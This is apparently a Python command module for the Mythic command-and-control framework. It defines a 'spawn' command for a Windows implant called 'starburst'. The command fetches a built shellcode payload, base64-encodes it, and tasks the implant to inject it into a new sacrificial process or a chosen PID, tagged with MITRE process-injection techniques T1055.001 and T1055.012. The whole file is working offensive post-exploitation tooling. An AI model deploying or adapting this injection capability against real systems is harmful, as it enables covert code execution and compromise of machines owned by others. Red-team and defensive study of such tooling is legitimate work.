from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class SpawnArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="template",
                cli_name="Payload",
                display_name="Payload Template (Shellcode)",
                type=ParameterType.Payload,
                description="Select a payload template to generate shellcode from.",
                supported_agents=["starburst"],
                supported_agent_build_parameters={
                    "starburst": {"output_type": "bin"},
                },
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1,
                    )
                ],
            ),
            CommandParameter(
                name="pid",
                cli_name="PID",
                display_name="Target PID (0 = spawn new)",
                type=ParameterType.Number,
                default_value=0,
                description="Process ID to inject into. Leave as 0 to spawn a new sacrifice process using the spawnto path.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=2,
                    ),
                ],
            ),
        ]

    async def parse_arguments(self):
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            raise Exception(
                "Require JSON arguments.\n\tUsage: {}".format(SpawnCommand.help_cmd)
            )


class SpawnCommand(CommandBase):
    cmd = "spawn"
    needs_admin = False
    help_cmd = "spawn -Payload <template> [-PID 1234]"
    description = "Inject shellcode into a new sacrifice process (via spawnto) or an existing process by PID. Generates a new payload instance from the selected template."
    version = 2
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1055.001", "T1055.012"]
    argument_class = SpawnArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: MythicCommandBase.PTTaskMessageAllData
    ) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        template_uuid = taskData.args.get_arg("template")

        payload_search = await SendMythicRPCPayloadSearch(
            MythicRPCPayloadSearchMessage(
                PayloadUUID=template_uuid,
            )
        )
        if not payload_search.Success or len(payload_search.Payloads) == 0:
            response.Success = False
            response.Error = f"Failed to find payload template: {template_uuid}"
            return response

        payload = payload_search.Payloads[0]
        if payload.BuildPhase != "success":
            response.Success = False
            response.Error = f"Template payload not built: {payload.BuildPhase}"
            return response

        file_content = await SendMythicRPCFileGetContent(
            MythicRPCFileGetContentMessage(
                AgentFileId=payload.AgentFileId,
            )
        )
        if not file_content.Success:
            response.Success = False
            response.Error = f"Failed to get payload content: {file_content.Error}"
            return response

        sc_bytes = file_content.Content
        if sc_bytes[:2] == b"MZ":
            response.Success = False
            response.Error = "Template is a PE executable, not raw PIC shellcode. Rebuild with output_type=bin."
            return response

        import base64

        taskData.args.add_arg(
            "shellcode_data",
            base64.b64encode(sc_bytes).decode(),
            ParameterType.String,
        )
        taskData.args.remove_arg("template")

        pid = taskData.args.get_arg("pid") or 0
        sc_len = len(sc_bytes)
        if pid and pid > 0:
            response.DisplayParams = (
                f"-PID {pid} -Shellcode ({sc_len} bytes)"
            )
        else:
            response.DisplayParams = f"-Shellcode ({sc_len} bytes) [spawnto]"

        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(
            TaskID=task.Task.ID, Success=True
        )
